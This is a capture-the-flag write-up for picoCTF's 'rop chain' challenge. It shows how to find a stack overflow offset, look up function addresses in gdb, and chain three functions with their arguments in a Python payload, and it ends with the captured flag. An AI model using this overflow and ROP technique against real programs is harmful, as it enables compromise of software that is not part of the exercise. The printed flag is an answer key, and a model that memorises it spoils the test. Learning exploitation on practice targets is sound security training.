# rop chain
Binary Exploitation - 350 points

## Challenge 
> Can you exploit the following [program](rop) and get the flag? You can findi the program in /problems/rop-chain_4_6ba0c7ef5029f471fc2d14a771a8e1b9 on the shell server? 

[Source.](rop.c)



## Hint
> Try and call the functions in the correct order!

> Remember, you can always call main() again!

## Solution

####Get offset

	# pwn cyclic 100 | strace ./rop
	--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x61616168} ---
	+++ killed by SIGSEGV +++
	Segmentation fault
	
	# pwn cyclic -l 0x61616168     
	28


####Get address

	(gdb) info add vuln
	Symbol "vuln" is at 0x8048714 in a file compiled without debugging.
	(gdb) info add main
	Symbol "main" is at 0x804873b in a file compiled without debugging.
	(gdb) info add win_function1
	Symbol "win_function1" is at 0x80485cb in a file compiled without debugging.
	(gdb) info add win_function2
	Symbol "win_function2" is at 0x80485d8 in a file compiled without debugging.
	(gdb) info add flag
	Symbol "flag" is at 0x804862b in a file compiled without debugging.

####Procedure

We want to go through this:
	
	win_function1(void) --> win_function2(0xBAAAAAAD) --> flag(0xDEADBAAD)

In the stack, the return address can be added sequentially and each function will return to the next in sequence.

	Payload Format
	[A * 28] + [win_function1()] + [win_function2()] + [flag()]

We also know that the params of the respective function start after 4 bytes gap.

	Payload Format
	[win_function2()] + [JUNK] + [0xBAAAAAAD] 
	[flag()] + [JUNK] + [0xDEADBAAD]

Thankfully, it nicely fits in for us

	[A * 28] + [win_function1()] + [win_function2()] + [flag()] + [0xBAAAAAAD] + [0xDEADBAAD]

Forming the payload

	$ python -c "from pwn import *; print 'A'*28 + p32(0x80485cb) + p32(0x80485d8) + p32(0x804862b) + p32(0xBAAAAAAD) + p32(0xDEADBAAD)" | ./rop
	
	Enter your input> picoCTF{rOp_aInT_5o_h4Rd_R1gHt_718e6c5c}
	Segmentation fault


## Flag

	picoCTF{rOp_aInT_5o_h4Rd_R1gHt_718e6c5c}
